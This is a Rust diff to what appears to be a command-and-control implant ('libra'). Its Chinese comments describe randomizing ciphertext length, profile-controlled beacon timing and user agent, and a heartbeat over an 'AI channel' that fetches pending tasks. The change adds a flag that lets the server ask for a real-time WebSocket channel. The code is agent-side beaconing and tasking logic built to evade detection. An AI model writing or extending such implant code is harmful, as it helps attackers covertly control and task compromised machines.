@@ -9,7 +9,7 @@
 //! 密文长度随机化：明文尾部追加随机数量空白（JSON 解析容忍），
 //! 心跳/结果节奏与 UA 由 profile 控制。
 
-use libra_common::models::{BeaconEnvelope, ProfileTransform};
+use libra_common::models::ProfileTransform;
 use libra_common::models::AgentTask;
 use rand::Rng;
 use reqwest::Client;
@@ -407,12 +407,12 @@ impl HttpCommunicator {
         })
     }
 
-    /// 心跳：op=hb，走 AI 通道。响应 SSE 内含 pendingTask。
+    /// 心跳：op=hb，走 AI 通道。返回 (待执行任务, 是否需要实时 WS 通道)。
     pub async fn heartbeat(
         &self,
         _agent_id: &str,
         session_key: Option<&[u8; AES_KEY_SIZE]>,
-    ) -> Result<Option<AgentTask>, String> {
+    ) -> Result<(Option<AgentTask>, bool), String> {
         let key = session_key.ok_or("no session key")?;
         let token = self.session_token.clone().unwrap_or_default();
 
@@ -427,14 +427,17 @@ impl HttpCommunicator {
         let v: Value = serde_json::from_str(&plain)
             .map_err(|e| format!("bad heartbeat payload: {e}"))?;
 
-        match v.get("pendingTask") {
+        let ws_needed = v.get("wsNeeded").and_then(|b| b.as_bool()).unwrap_or(false);
+
+        let task = match v.get("pendingTask") {
             Some(task_val) if !task_val.is_null() => {
                 let task_json = serde_json::to_string(task_val)
                     .map_err(|e| format!("task serialize: {e}"))?;
-                Ok(Some(parse_task(&task_json)))
+                Some(parse_task(&task_json))
             }
-            _ => Ok(None),
-        }
+            _ => None,
+        };
+        Ok((task, ws_needed))
     }
 
     /// 提交任务结果：op=res，走 AI 通道。
